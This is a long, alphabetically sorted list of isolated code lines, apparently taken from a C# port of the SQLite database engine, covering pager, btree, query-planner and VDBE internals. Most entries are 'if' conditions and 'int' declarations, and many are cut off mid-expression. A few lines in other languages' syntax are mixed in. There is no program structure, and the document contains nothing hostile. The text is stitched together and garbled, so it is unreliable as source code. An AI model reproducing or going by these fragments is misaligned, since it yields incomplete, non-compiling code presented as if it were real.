      if ( isMainJrnl != 0 )
      if ( isNT() )
      if ( isOpen( pPager.fd ) )
      if ( isOpen( pPager.jfd ) 
      if ( isOpen( pPager.jfd ) )
      if ( isOpen( pPager.sjfd ) )
      if ( isTemp != 0 )
      if ( isView != 0 
      if ( isView )
      if ( iz < zIn.Length 
      if ( j >= nTerm )
      if ( k < pEList.nExpr )
      if ( key )
      if ( len == 0 ) zMaster[0] = 0
      if ( limitId < 0 
      if ( locktype == EXCLUSIVE_LOCK 
      if ( locktype == NO_LOCK 
      if ( locktype == SHARED_LOCK 
      if ( magic != SQLITE_MAGIC_OPEN
      if ( magic != SQLITE_MAGIC_SICK 
      if ( makeDflt != 0 
      if ( mem0.alarmCallback != null )
      if ( memId > 0 )
      if ( memRootPage >= 0 )
      if ( meta[BTREE_TEXT_ENCODING - 1] != 0 )
      if ( minusFlag != 0 )
      if ( ms > 0 )
      if ( mxPage > 0 )
      if ( n - 1 < zBuf.Length ) zBuf.Length = n - 1
      if ( n < 0 )
      if ( n < 0 ) n = 0
      if ( n < 1 )
      if ( n < 2 ) return TK_ID
      if ( n < 50 )
      if ( n <= 0 
      if ( n <= 0 )
      if ( n == P4_INT32 )
      if ( n > 0 
      if ( n > 0 )
      if ( n > db.aLimit[SQLITE_LIMIT_LENGTH] )
      if ( nByte < 0 )
      if ( nByte <= pcache1.szSlot 
      if ( nByte > iLimit )
      if ( nBytes <= 0 )
      if ( nBytes >= 0 
      if ( nBytes >= 0x7fffff00 )
      if ( nCellKey <= 0 
      if ( nChar > 0 )
      if ( nColumn > 0 )
      if ( nErr > 0 
      if ( nExpr > 1 
      if ( nHeader > JOURNAL_HDR_SZ( pPager ) )
      if ( nHeight > mxHeight )
      if ( nIdx > 0 )
      if ( nNew < 256 )
      if ( nOp < 1 ) return
      if ( nOps > 0 )
      if ( nPage > pPager.mxPgno )
      if ( nPagePerSector > 1 )
      if ( nPat > db.aLimit[SQLITE_LIMIT_LIKE_PATTERN_LENGTH] )
      if ( nReg <= n 
      if ( nReg > pParse.nRangeReg )
      if ( nSavepoint > nCurrent 
      if ( nSrcPgsz != nDestPgsz 
      if ( nVar >= 0 /
      if ( needQuote ) { if ( i == z.Length ) z.Append( '
      if ( needSyncPgno != 0 )
      if ( needXcommit 
      if ( neg != 0 )
      if ( negP2 != 0 )
      if ( newIdx >= 0 )
      if ( newLimit >= 0 )
      if ( new_elem == null ) return data
      if ( new_ht == null ) return false
      if ( noContent != 0 )
      if ( null == db /
      if ( null == p 
      if ( null == p.pDirtyTail )
      if ( null == p.pSynced 
      if ( null == pCache.pCache 
      if ( null == pMaster )
      if ( null == pPage 
      if ( null == pPage )
      if ( null == pSrc.pIndex )
      if ( null == pTab.pSelect )
      if ( null == pVdbeFunc 
      if ( null == zMaster 
      if ( offset 
      if ( okOnePass != 0 )
      if ( omitJournal )
      if ( onError != OE_Abort 
      if ( onError == OE_Default )
      if ( onoff != 0 )
      if ( op != TK_ALL )
      if ( op < 0 
      if ( op == TK_ALL 
      if ( op == TK_ALL )
      if ( op == TK_CAST )
      if ( op == TK_EXCEPT 
      if ( op == TK_IN )
      if ( op == TK_INTERSECT )
      if ( op == TK_SELECT )
      if ( op == TK_STRING 
      if ( opcodeProperty == null ) opcodeProperty = OPFLG_INITIALIZER
      if ( openedTransaction != 0 )
      if ( overage > 0 )
      if ( p != null 
      if ( p != null )
      if ( p == null 
      if ( p == null )
      if ( p == null ) return
      if ( p == null ) return 0
      if ( p == null ) return SQLITE_MISUSE
      if ( p == null ) return SQLITE_OK
      if ( p == null ) return null
      if ( p == null /
      if ( p.Context == null ) p.Context = pMem
      if ( p.aLabel != null )
      if ( p.aOp != null )
      if ( p.aOp == null ) p.aOp = new VdbeOp[nNew]
      if ( p.aOp == null /
      if ( p.aOp[i] == null ) p.aOp[i] = new VdbeOp()
      if ( p.apCsr == null ) return
      if ( p.apCsr[iCur] != null )
      if ( p.contextStack != null )
      if ( p.deferredMoveto )
      if ( p.explain != 0 )
      if ( p.iDivisor != 0 )
      if ( p.iLimit != 0 
      if ( p.iLimit != 0 )
      if ( p.iLimit != 0 ) return
      if ( p.iOffset != 0 
      if ( p.iSize <= BITVEC_NBIT )
      if ( p.isAttached != 0 )
      if ( p.isPrepareV2 
      if ( p.magic != VDBE_MAGIC_RUN 
      if ( p.magic != VDBE_MAGIC_RUN )
      if ( p.magic == VDBE_MAGIC_RUN 
      if ( p.nArg == -1 
      if ( p.nCol 
      if ( p.nFresh == 0 )
      if ( p.nHash != 0 ) { sqlite3BeginBenignMalloc()
      if ( p.nHash != 0 ) { sqlite3EndBenignMalloc()
      if ( p.nOp 
      if ( p.nOp != 0 )
      if ( p.nOp > addr )
      if ( p.nOpAlloc <= i )
      if ( p.nRef == 0 )
      if ( p.nSet >= BITVEC_MXHASH )
      if ( p.nSrc > 0 ) pNew.a = new SrcList_item[p.nSrc]
      if ( p.nTab == 0 )
      if ( p.op == TK_COLUMN 
      if ( p.op == TK_COLUMN )
      if ( p.pCheck != null )
      if ( p.pDestDb != null )
      if ( p.pEList.nExpr != pPrior.pEList.nExpr )
      if ( p.pEntry != null )
      if ( p.pGroupBy != null )
      if ( p.pHaving != null )
      if ( p.pLeft != null )
      if ( p.pLimit != null )
      if ( p.pLimit != null ) return 0
      if ( p.pNext != null )
      if ( p.pOrderBy != null 
      if ( p.pOrderBy != null )
      if ( p.pPrev != null )
      if ( p.pPrior != null )
      if ( p.pPrior != null ) return 0
      if ( p.pRight != null )
      if ( p.pRightmost != null 
      if ( p.pSrc != null )
      if ( p.pSynced == pPage )
      if ( p.pTree != null )
      if ( p.pWhere != null 
      if ( p.pWhere != null )
      if ( p.pWhere != null ) return 0
      if ( p.pc < 0 )
      if ( p.pc <= 0 
      if ( p.pc == 0
      if ( p.pc >= 0 )
      if ( p.pgno == 1 )
      if ( p.rc == SQLITE_NOMEM )
      if ( p.readpoint.iOffset != iOfst 
      if ( p.tempReg != 0 )
      if ( p.tooBig != 0 )//
      if ( p.validHMS != 0 )
      if ( p.validHMS != 0 ) return
      if ( p.validJD != 0 ) return
      if ( p.validTZ != 0 )
      if ( p.validYMD != 0 )
      if ( p.validYMD != 0 ) return
      if ( p.zText.ToString() != p.zBase.ToString() )
      if ( p0type != SQLITE_BLOB )
      if ( p0type == SQLITE_BLOB )
      if ( p1 
      if ( p1 < 0 )
      if ( p4 != null )
      if ( pA != null )
      if ( pA == null 
      if ( pA.iTable != pB.iTable 
      if ( pA.op != pB.op ) return false
      if ( pA.x.pList != null 
      if ( pAccum != null )
      if ( pAccum.Context == null ) pAccum.Context = pMem
      if ( pAggInfo.nFunc 
      if ( pAlias.n != 0 )
      if ( pAuxData.pAux != null 
      if ( pBest != null 
      if ( pBest == null ) return
      if ( pBest.flags != 0 )
      if ( pBitvec == null 
      if ( pBt != null )
      if ( pBuf == null ) pBuf = new byte[amt]
      if ( pCache != null )
      if ( pCache.bPurgeable 
      if ( pCache.bPurgeable )
      if ( pCache.nHash > 0 )
      if ( pCache.nPage >= pCache.nHash 
      if ( pCache.pCache != null )
      if ( pCol.isPrimKey != 0 )
      if ( pCol.notNull != 0 
      if ( pColl != null 
      if ( pColl != null )
      if ( pColl == null ) return 0
      if ( pColumn != null 
      if ( pColumn != null )
      if ( pColumn == null 
      if ( pCur.eState >= CURSOR_REQUIRESEEK )
      if ( pCx == null )
      if ( pCx.pBt != null )
      if ( pDatabase != null 
      if ( pDatabase != null )
      if ( pDb != null )
      if ( pDb.pBt == null )
      if ( pDb.pSchema.cache_size == 0 )
      if ( pDb.pSchema.file_format == 0 )
      if ( pDb.pSchema.file_format > SQLITE_MAX_FILE_FORMAT )
      if ( pDb.pSchema.file_format >= 4 )
      if ( pDest.eDest <= SRT_Discard ) //IgnorableOrderby(pDest))
      if ( pDest.eDest == SRT_EphemTab )
      if ( pDest.eDest == SRT_Output )
      if ( pDest.iMem == 0 )
      if ( pDest.iPKey != pSrc.iPKey )
      if ( pDest.iPKey >= 0 )
      if ( pDest.nCol != pSrc.nCol )
      if ( pDest.nColumn != pSrc.nColumn )
      if ( pDest.onError != pSrc.onError )
      if ( pDest.pCheck != null 
      if ( pDflt != null 
      if ( pDflt != null )
      if ( pDone != null 
      if ( pE != null 
      if ( pE.op == TK_ID )
      if ( pEList != null 
      if ( pEList == null 
      if ( pEList == null )
      if ( pEList.a[0].pExpr.op != TK_AGG_COLUMN ) return WHERE_ORDERBY_NORMAL
      if ( pEList.a[0].pExpr.op != TK_ALL )
      if ( pEList.a[0].pExpr.op != TK_COLUMN ) return 0
      if ( pEList.nExpr != 1 )
      if ( pEList.nExpr != 1 ) return 0
      if ( pEList.nExpr != 1 ) return WHERE_ORDERBY_NORMAL
      if ( pEngine == null )
      if ( pEntry != null )
      if ( pExpr != null 
      if ( pExpr != null )
      if ( pExpr == null )
      if ( pExpr == null ) return
      if ( pExpr == null ) return 0
      if ( pExpr == null ) return WRC_Continue
      if ( pExpr == null ) return null
      if ( pExpr.iColumn >= 0 
      if ( pExpr.op != TK_AGG_FUNCTION ) return 0
      if ( pExpr.op != TK_AGG_FUNCTION ) return null
      if ( pExpr.op != TK_FUNCTION
      if ( pExpr.op != op )
      if ( pExpr.op == TK_COLUMN 
      if ( pExpr.op >= TK_GT )
      if ( pExpr.pRight != null )
      if ( pFKey == null )
      if ( pFd.pMethods == null )
      if ( pFile != null )
      if ( pFile.locktype == NO_LOCK
      if ( pFile.locktype >= RESERVED_LOCK )
      if ( pFile.locktype >= locktype )
      if ( pFrom.nVar != pTo.nVar )
      if ( pFrom.pTab != null 
      if ( pFromCol == null )
      if ( pH.count <= 0 )
      if ( pH.count >= 10 
      if ( pH.ht != null 
      if ( pH.ht != null )
      if ( pH.htsize != 0 )
      if ( pHead != null )
      if ( pId.pMethods != null )
      if ( pIdList == null 
      if ( pIdx.onError != OE_None 
      if ( pIdx.onError != OE_None )
      if ( pIdx.zColAff == null 
      if ( pIn.pLeft != null )
      if ( pIn.pRight != null )
      if ( pIndex != null )
      if ( pIndex == null )
      if ( pIndex.autoIndex != 0 )
      if ( pIndex.onError != OE_None )
      if ( pInfo != null )
      if ( pKey != null )
      if ( pLast != null )
      if ( pLeft == null )
      if ( pLeft.op != TK_COLUMN )
      if ( pLevel.iFrom > 0 
      if ( pLevel.iLeftJoin != 0 )
      if ( pList != null )
      if ( pList == null )
      if ( pList == null ) return
      if ( pList == null ) return -1
      if ( pList == null ) return 0
      if ( pList.nAlloc <= pList.nExpr )
      if ( pMaster != null )
      if ( pMem != null )
      if ( pMem != null ) p = pMem._SumCtx
      if ( pMem._StrAccum == null ) pMem._StrAccum = new StrAccum()
      if ( pMem._SumCtx == null ) pMem._SumCtx = new SumCtx()
      if ( pMem.db != null )
      if ( pMem.r == (double)pMem.u.i 
      if ( pMem.z != null 
      if ( pMem.z == null )
      if ( pNC.hasAgg != 0 )
      if ( pNC.nDepth == 0 )
      if ( pNC.nErr > 0 
      if ( pNC.pSrcList != null 
      if ( pName != null 
      if ( pName != null )
      if ( pName1 == null )
      if ( pName2.n == 0 
      if ( pNew != null )
      if ( pNew == null )
      if ( pNew == null ) goto exit_begin_add_column
      if ( pNew == null ) return null
      if ( pNew.a == null )
      if ( pNew.aCol == null 
      if ( pNew.pIndex != null )
      if ( pOld == null )
      if ( pOp.opcode == OP_SCopy 
      if ( pOp.opcode == OP_Trace 
      if ( pOrInfo == null ) return
      if ( pOrderBy != null )
      if ( pOrderBy == null 
      if ( pOrderBy == null ) return 0
      if ( pOrderBy == null /
      if ( pOrig.op != TK_COLUMN 
      if ( pOther != null )
      if ( pOut == null ) pOut = System.Console.Out
      if ( pPage != null 
      if ( pPage != null )
      if ( pPage.pDirtyNext != null )
      if ( pPage.pDirtyPrev != null )
      if ( pPager.dbModified == false 
      if ( pPager.dbSize < (int)pPg.pgno )
      if ( pPager.dbSizeValid )
      if ( pPager.errCode != 0 )
      if ( pPager.errCode == SQLITE_OK 
      if ( pPager.fullSync )
      if ( pPager.journalOff 
      if ( pPager.journalOff != 0 )
      if ( pPager.journalOff == 0 )
      if ( pPager.needSync )
      if ( pPager.noSync )
      if ( pPager.noSync ) pPager.needSync = false
      if ( pPager.pInJournal == null )
      if ( pPager.sectorSize < 512 )
      if ( pPager.sectorSize > MAX_SECTOR_SIZE )
      if ( pPager.state < PAGER_RESERVED )
      if ( pPager.state == PAGER_SHARED )
      if ( pPager.state == PAGER_UNLOCK 
      if ( pPager.state >= PAGER_EXCLUSIVE 
      if ( pPager.state >= locktype )
      if ( pParse == null )
      if ( pParse.checkSchema != 0)
      if ( pParse.colNamesSet != 0 
      if ( pParse.cookieGoto == 0 )
      if ( pParse.explain != 0 )
      if ( pParse.nErr != 0 )
      if ( pParse.nErr != 0 ) return
      if ( pParse.nErr != 0 ) return null
      if ( pParse.nErr != 0 /
      if ( pParse.nErr == 0 
      if ( pParse.nTab < baseCur 
      if ( pParse.nTempReg == 0 )
      if ( pParse.nVar > 0 )
      if ( pParse.nested != 0 )
      if ( pParse.nested != 0 ) return
      if ( pParse.nested == 0 
      if ( pParse.nested == 0 )
      if ( pParse.nested == 0 ) sqlite3VdbeCountChanges( v )
      if ( pParse.pNewTrigger == null )
      if ( pParse.pVdbe != null 
      if ( pParse.rc != SQLITE_OK 
      if ( pParse.rc == SQLITE_DONE ) pParse.rc = SQLITE_OK
      if ( pParse.rc == SQLITE_SCHEMA )
      if ( pParse.zErrMsg != null )
      if ( pPg != null )
      if ( pPg!=null )
      if ( pPgOld != null )
      if ( pPrev == null ) pCache.apHash[h] = pp.pNext
      if ( pPrior.pLimit != null )
      if ( pPrior.pOrderBy != null )
      if ( pPrior.pPrior == null )
      if ( pProbe == null 
      if ( pRes != null )
      if ( pRet == null 
      if ( pRight.op != TK_STRING )
      if ( pRoot == null )
      if ( pSavepoint != null )
      if ( pSchema != null )
      if ( pSel != null )
      if ( pSelect != null )
      if ( pSelect == null )
      if ( pSelect.iLimit != 0 )
      if ( pSelect.pGroupBy != null )
      if ( pSelect.pLimit != null )
      if ( pSelect.pOrderBy != null )
      if ( pSelect.pPrior != null )
      if ( pSelect.pSrc.a[0].pSelect != null )
      if ( pSelect.pSrc.nSrc != 1 )
      if ( pSelect.pWhere != null )
      if ( pSrc == null )
      if ( pSrc == pDest )
      if ( pSrc.a[0].pSelect != null ) return 0
      if ( pSrc.nSrc 
      if ( pSrc.nSrc != 1 ) return 0
      if ( pSrc.notIndexed != 0 )
      if ( pSrc.pIndex != null )
      if ( pSrc.pSelect != null )
      if ( pSrcDb == pDestDb )
      if ( pStmt != null )
      if ( pStmt != null ) sqlite3VdbeFinalize( pStmt )
      if ( pStmt == null )
      if ( pSub.pLimit != null 
      if ( pSub.pOffset != null ) return 0
      if ( pSub.pPrior != null )
      if ( pSubSrc.nSrc == 0 ) return 0
      if ( pTab != null 
      if ( pTab != null )
      if ( pTab == null 
      if ( pTab == null )
      if ( pTab == null ) goto delete_from_cleanup
      if ( pTab == null ) goto exit_begin_add_column
      if ( pTab == null ) goto exit_rename_table
      if ( pTab == null ) goto update_cleanup
      if ( pTab == pParse.pNewTable )
      if ( pTab.pCheck != null 
      if ( pTab.pSchema != pTempSchema )
      if ( pTab.pSelect != null 
      if ( pTab.pSelect != null )
      if ( pTab.pSelect == null 
      if ( pTab.zColAff == null )
      if ( pTabList.nSrc > BMS )
      if ( pTable == null )
      if ( pTable == null ) return
      if ( pTable.nCol < 0 )
      if ( pTable.nCol > 0 ) return 0
      if ( pTable.nRef > 0 )
      if ( pTableName == null /
      if ( pTblName != null )
      if ( pTerm != null
      if ( pTmpSchema != pTab.pSchema )
      if ( pToCol != null )
      if ( pToken != null )
      if ( pTrigger != null )
      if ( pTrigger == null )
      if ( pTrigger == null ) goto trigger_cleanup
      if ( pTrigger == null ) return
      if ( pTriggerStep == null )
      if ( pVal == null ) return null
      if ( pVal.enc == ( enc 
      if ( pVfs == null )
      if ( pVfs == null ) return 0
      if ( pVm != null 
      if ( pVm == null 
      if ( pWC.a != pWC.aStatic )
      if ( pWC.nTerm >= pWC.nSlot )
      if ( pWInfo != null )
      if ( pWInfo == null ) goto update_cleanup
      if ( pWalker.u.i == 3 
      if ( pWhere != null 
      if ( pWhere != null )
      if ( pX.op == TK_EQ )
      if ( pageInJournal( pPg ) 
      if ( pcache1.isInit != 0 )
      if ( pgno == 0 
      if ( pgno == 0 )
      if ( pgno == 1 )
      if ( pgno > pPager.dbSize 
      if ( pgno > pPager.mxPgno )
      if ( pnEntry >= pnAlloc )
      if ( pp == pCache.apHash[h] ) pCache.apHash[h] = pp.pNext
      if ( ppList == null )
      if ( preserve != 0 )
      if ( prior 
      if ( pzErrMsg != null ) pzErrMsg = null
      if ( pzOriginDb != null )
      if ( r < (double)minInt )
      if ( r < 0 )
      if ( r1 == r2 )
      if ( r2 == r1 )
      if ( rc != 0 )
      if ( rc != 0 ) goto end_of_vacuum
      if ( rc != 0 ) return null
      if ( rc != 0 ) return rc
      if ( rc != SQLITE_IOERR_NOMEM )
      if ( rc != SQLITE_OK 
      if ( rc != SQLITE_OK )
      if ( rc != SQLITE_OK ) goto delmaster_out
      if ( rc != SQLITE_OK ) goto end_of_vacuum
      if ( rc != SQLITE_OK ) return rc
      if ( rc != SQLITE_ROW 
      if ( rc == 0 
      if ( rc == 0 )
      if ( rc == SQLITE_CONSTRAINT )
      if ( rc == SQLITE_IOERR_SHORT_READ )
      if ( rc == SQLITE_NOMEM 
      if ( rc == SQLITE_NOMEM )
      if ( rc == SQLITE_OK 
      if ( rc == SQLITE_OK )
      if ( rc == SQLITE_SCHEMA )
      if ( rc == WRC_Continue
      if ( rcauth == SQLITE_DENY )
      if ( rcauth == SQLITE_OK 
      if ( regPrev != 0 )
      if ( res != 0 )
      if ( res == 0 )
      if ( resetFlag != 0 )
      if ( resetFlag != 0 ) pVdbe.aCounter[op - 1] = 0
      if ( reuseUnlikely != 0 
      if ( rowidChng )
      if ( serial_type <= 7 
      if ( serial_type >= 12 )
      if ( setStatement != 0 
      if ( skipKey )
      if ( sqlite3Autoext.nExt == 0 )
      if ( sqlite3BtreeIsInReadTrans( pDb.pBt ) 
      if ( sqlite3ExprAffinity( pLeft ) != SQLITE_AFF_TEXT ) return 0
      if ( sqlite3ExprIsConstantNotJoin( p ) == 0 )
      if ( sqlite3GlobalConfig == null ) sqlite3GlobalConfig = sqlite3Config
      if ( sqlite3GlobalConfig.bCoreMutex )
      if ( sqlite3GlobalConfig.bCoreMutex == false )
      if ( sqlite3GlobalConfig.bFullMutex 
      if ( sqlite3GlobalConfig.bMemstat )
      if ( sqlite3GlobalConfig.isInit != 0 )
      if ( sqlite3GlobalConfig.isInit != 0 ) return SQLITE_MISUSE
      if ( sqlite3GlobalConfig.isInit != 0 ) return SQLITE_OK
      if ( sqlite3GlobalConfig.isInit == 0 
      if ( sqlite3GlobalConfig.isMallocInit == 0 )
      if ( sqlite3GlobalConfig.m.xMalloc == null )
      if ( sqlite3GlobalConfig.m.xShutdown != null )
      if ( sqlite3GlobalConfig.nRefInitMutex <= 0 )
      if ( sqlite3GlobalConfig.pPage != null 
      if ( sqlite3GlobalConfig.pScratch != null 
      if ( sqlite3GlobalConfig.pcache.xInit == null )
      if ( sqlite3GlobalConfig.pcache.xShutdown != null )
      if ( sqlite3GlobalConfig.szScratch < n )
      if ( sqlite3IsNaN( val ) )
      if ( sqlite3Isdigit( z[0] ) )
      if ( sqlite3JournalSize( pVfs ) > sqlite3MemJournalSize() )
      if ( sqlite3SafetyOff( db ) )
      if ( sqlite3SafetyOn( db ) )
      if ( sqlite3Strlen30( pTab.zName ) > 6
      if ( sqlite3_diskfull_pending.iValue != 0 )
      if ( sqlite3_initialize() != 0 ) return null
      if ( sqlite3_initialize() == SQLITE_OK )
      if ( sqlite3_io_error_benign == 0 ) sqlite3_io_error_hardhit.iValue
      if ( sqlite3_io_error_pending.iValue <= 0 )
      if ( sqlite3_value_type( argv[0] ) == SQLITE_NULL )
      if ( sqlite3_value_type( argv[0] ) == SQLITE_NULL ) return
      if ( sqlite3_value_type( argv[1] ) == SQLITE_NULL
      if ( subqueryIsAgg 
      if ( testAddr != 0 )
      if ( tr_tm == TK_INSTEAD )
      if ( true )
      if ( type != TK_DEFERRED )
      if ( type >= EXCLUSIVE_LOCK )
      if ( type >= PENDING_LOCK )
      if ( type >= RESERVED_LOCK )
      if ( unlikely( (u32)m.n < szHdr 
      if ( unlikely( szHdr < 3 
      if ( unlikely( typeRowid < 1 
      if ( useSeekResult )
      if ( useTempTable )
      if ( v != null 
      if ( v != null )
      if ( v - neg > 2147483647 )
      if ( v <= 0x7F ) return 1
      if ( v == null 
      if ( v == null )
      if ( v == null ) goto exit_begin_add_column
      if ( v == null ) goto insert_cleanup
      if ( v == null ) goto select_end
      if ( v == null ) goto update_cleanup
      if ( v == null ) return
      if ( v == null ) return null
      if ( val < min 
      if ( viewOk == 0 
      if ( wsdHooks.xBenignBegin != null )
      if ( wsdHooks.xBenignEnd != null )
      if ( wsdStat.nowValue[op] > wsdStat.mxValue[op] )
      if ( x.Y < 1971 
      if ( xDel == SQLITE_TRANSIENT )
      if ( xDelete != null )
      if ( z != null )
      if ( z == null 
      if ( z == null )
      if ( z == null ) return
      if ( z == null ) return 0
      if ( z.Length == 1 )
      if ( z.Length > 1 )
      if ( z1 == null )
      if ( z2 != null )
      if ( z2 == null )
      if ( zA != null 
      if ( zAlias1 == null )
      if ( zAlias2 == null )
      if ( zBlob != null )
      if ( zBuf == null )
      if ( zCol != null )
      if ( zColl == null ) return
      if ( zConverted == null 
      if ( zDate[zIndex] == '-' )
      if ( zDbName == null )
      if ( zFile != null 
      if ( zFormat == null ) return null
      if ( zFunctionName == null 
      if ( zHex != null )
      if ( zIn == null 
      if ( zIn == null ) return
      if ( zIn.Length == 0 ) return 0
      if ( zIndex < z.Length 
      if ( zIndex < zDate.Length 
      if ( zIndex == z.Length 
      if ( zMasterJournal != null )
      if ( zName != null 
      if ( zName != null )
      if ( zName == null 
      if ( zName == null ) goto exit_rename_table
      if ( zName == null ) return
      if ( zName.Length == nName ) pIndex.zName = zName
      if ( zNum.Length <= 18 )
      if ( zNum[iZnum] == '-' )
      if ( zOut != null )
      if ( zPathname != null )
      if ( zPattern == null )
      if ( zProc == null 
      if ( zRep == null ) return
      if ( zSql != null )
      if ( zSql == null )
      if ( zSql.Length >= i 
      if ( zStr == null ) return
      if ( zTerm == zInLength )
      if ( zType != null 
      if ( zWhere == null ) return
      if ( z[0] >= '0' 
      if ( z[zIndex] == '-' 
      if (!String.IsNullOrEmpty(zFilename) 
      if (!String.IsNullOrEmpty(zMsg1))
      if (!p.sharable 
      if (!pBt.autoVacuum)
      if (!pBt.incrVacuum)
      if ((flags 
      if ((i 
      if ((pRC) == SQLITE_OK)
      if ((pageFlags 
      if ((rc = btreeInitPage(pPage)) != 0)
      if (0 == loc)
      if (0 == pCheck.mxErr) return
      if (0 == pCur.apPage[0].intKey)
      if (0 == pPage.isInit)
      if (0 == pPage.leaf)
      if (CURSOR_INVALID == pCur.eState)
      if (CURSOR_VALID == pCur.eState 
      if (NEVER( p == null )) return
      if (NEVER( pList == null )) return SQLITE_OK
      if (NEVER(nRef != sqlite3PagerRefcount(pBt.pPager)))
      if (NEVER(offset 
      if (NEVER(p.inTrans != TRANS_WRITE 
      if (NEVER(pBt.pCursor))
      if (NEVER(pCur.aiIdx[pCur.iPage] >= pCur.apPage[pCur.iPage].nCell)
      if (NEVER(pCur.info.nSize == 0))
      if (NEVER(pPager.errCode) != 0) return pPager.errCode
      if (NEVER(pParser == null)) return
      if (NEVER(pParser.yyidx < 0)) return 0
      if (NEVER(rc != SQLITE_OK) 
      if (NEVER(wrFlag != 0 
      if (SQLITE_OK != rc) goto trans_begun
      if (SQLITE_OK == rc)
      if (apOld[0].pgno <= 1)
      if (cbrk - iCellFirst != pPage.nFree)
      if (data[hdr 
      if (eOp != 0)
      if (ePtrmapType != eType 
      if (eType != PTRMAP_ROOTPAGE)
      if (eType != pPtrmap[offset] 
      if (eType == PTRMAP_BTREE 
      if (eType == PTRMAP_OVERFLOW2)
      if (flagByte == (PTF_LEAFDATA 
      if (freePageFlag != 0)
      if (gap 
      if (gap > top)
      if (i < 0 
      if (i < 2)
      if (i <= sCheck.nPage)
      if (iCell < 0)// Overflow Cell
      if (iFix != 0) pBt.pageSizeFixed = true
      if (iIdx == pParent.nCell)
      if (iPage == 0) return 0
      if (iPage == 0) return 1
      if (iPage > pCheck.nPage)
      if (iTable == 1 
      if (iTable > 1)
      if (idx >= pPage.nCell)
      if (info.iOverflow != 0)
      if (info.iOverflow == 0)
      if (isRoot != 0 
      if (key == 0)
      if (likely(nPayload <= pPage.maxLocal))
      if (loc == 0)
      if (mutexOpen != null)
      if (n > 0)
      if (n >= mxPage)
      if (nFin == 0)
      if (nFrag >= 60)
      if (nFree != 0)
      if (nReserve < 0)
      if (nSize < 4)
      if (nSize > pPage.maxLocal)
      if (null == pBt.pHasContent)
      if (null == pBt.pSchema 
      if (null == pBt.pTmpSpace)
      if (offset < 0)
      if (offset < pCur.info.nLocal)
      if (p != null 
      if (p.CacheAllocated) //if ( p >= pcache1.pStart 
      if (p.inTrans == TRANS_WRITE 
      if (p.inTrans == TRANS_WRITE)
      if (pBt == null)
      if (pBt.autoVacuum)
      if (pBt.inTransaction == TRANS_NONE 
      if (pBt.pageSizeFixed 
      if (pBt.pageSizeFixed)
      if (pBt.readOnly 
      if (pBtree != null)
      if (pCheck.anRef[iPage] == 1)
      if (pCheck.errMsg.nChar != 0)
      if (pCsr != null)
      if (pCur.eState != CURSOR_VALID 
      if (pCur.eState != CURSOR_VALID)
      if (pCur.eState == CURSOR_FAULT)
      if (pCur.eState == CURSOR_INVALID)
      if (pCur.eState == CURSOR_VALID 
      if (pCur.eState >= CURSOR_REQUIRESEEK)
      if (pCur.iPage >= (BTCURSOR_MAX_DEPTH - 1))
      if (pCur.iPage >= 0)
      if (pCur.info.nSize == 0)
      if (pCur.pKeyInfo == null)
      if (pCur.pNext != null)
      if (pCur.skipNext < 0)
      if (pCur.skipNext > 0)
      if (pDbPage)
      if (pEType < 1 
      if (pKey != null)
      if (pMemPage != null)
      if (pNewPage.nCell < 1 
      if (pPage != null)
      if (pPage == null 
      if (pPage.hasData != 0)
      if (pPage.intKey != 0)
      if (pPage.isInit != 0)
      if (pPage.leaf != 0)
      if (pPage.nCell <= 0)
      if (pPage.nOverflow != 0 
      if (pParser != null)
      if (pRC != 0) return
      if (pRoot.nCell == 0 
      if (pageSize >= 512 
      if (pbegin > iLast)
      if (pgno > pagerPagecount(pBt))
      if (ppPage != null)
      if (rc != 0)
      if (rc != 0) goto end_insert
      if (rc != 0) goto freepage_out
      if (rc != 0) return rc
      if (rc != SQLITE_OK)
      if (rc != SQLITE_OK) return rc
      if (rc == SQLITE_OK 
      if (rc == SQLITE_OK)
      if (ret == PENDING_BYTE_PAGE(pBt))
      if (sCheck.nErr == 0) sqlite3StrAccumReset(sCheck.errMsg)
      if (sCheck.nPage == 0)
      if (stateno > YY_SHIFT_MAX 
      if (yyTraceFILE != null 
      if (yyTraceFILE != null)
      if (yyact < YYNSTATE)
      if (yypParser.yyidx < 0)
      if (yypParser.yyidx >= YYSTACKDEPTH)
      if flag==null then
      if( !pTab->aCol ){
      if( db->aVTrans[i]==pVTab ){
      if( p ){
      if( pExpr->iTable==pTabList->a[iSrc].iCursor ){
      if( pVTab->db->magic==SQLITE_MAGIC_BUSY ){
      in-memory cache pages to the state they were in when the transaction
      indexable = 
      info = new CellInfo()
      initData.db = db
      initData.iDb = iDb
      initData.pzErrMsg = pzErrMsg
      initData.rc = SQLITE_OK
      int Dummy0 = 0
      int LastResult = CSSQLite.sqlite3_step( vm )
      int NDELAY = delays.Length
      int Y = 0
      int _fmt = 0
      int _pIter = pPage.childPtrSize
      int _z = 0
      int addr
      int addr = 0
      int addr1
      int addrAeqB
      int addrAgtB
      int addrAltB
      int addrBreak = sqlite3VdbeMakeLabel( v )
      int addrBrk
      int addrCont
      int addrCont = 0
      int addrContinue = sqlite3VdbeMakeLabel( v )
      int addrEofA
      int addrEofB
      int addrInsTop = 0
      int addrNxt
      int addrOutA
      int addrOutB = 0
      int addrSelect = 0
      int addrSelectA
      int addrSelectB
      int addrSortIndex
      int andFlags
      int available = 0
      int bRev
      int balance_deeper_called = 0
      int balance_quick_called = 0
      int baseCur = 0
      int bestScore = 0
      int btFlags = 0
      int bufpt
      int bytesPerSector = SQLITE_DEFAULT_SECTOR_SIZE
      int c
      int c = 0
      int c = zIn[zIndex
      int c0 = getDigits( zDate 
      int c1 = getDigits( zDate1 
      int callbackIsInit
      int cbrk
      int cellOffset
      int cellbody
      int cksum = 0
      int cnt
      int cnt = 0
      int cntTab = 0
      int combined_flags
      int count
      int d
      int d1
      int digit
      int dist = 3
      int distinct
      int dummy = 0
      int dwDummy = 0
      int e
      int eCreate
      int eDest = pDest.eDest
      int eType
      int eType = 0
      int emptyDestTest
      int emptySrcTest
      int enc2
      int end
      int endOfLoop
      int endOfLoop = 0
      int error
      int escape = 0
      int exists = 0
      int expected = N
      int f
      int f = pMem.flags
      int fg = pMem.flags
      int flags
      int flags = pMem.flags
      int gap
      int h
      int h = ( sqlite3UpperToLower[c1] 
      int h = 0
      int hdr
      int hdr = pPage.hdrOffset
      int i
      int i = -1
      int i = -1000000
      int i = 0
      int i = pCur.iPage
      int i = pPager.pageSize - 200
      int iBeginAfterTrigger = 0
      int iBeginBeforeTrigger = 0
      int iBest
      int iCellDepth
      int iCellFirst
      int iCellIdx
      int iCellLast
      int iChunkOffset
      int iCol
      int iCompare = 0
      int iContinue
      int iCur
      int iCur = pLevel.iTabCur
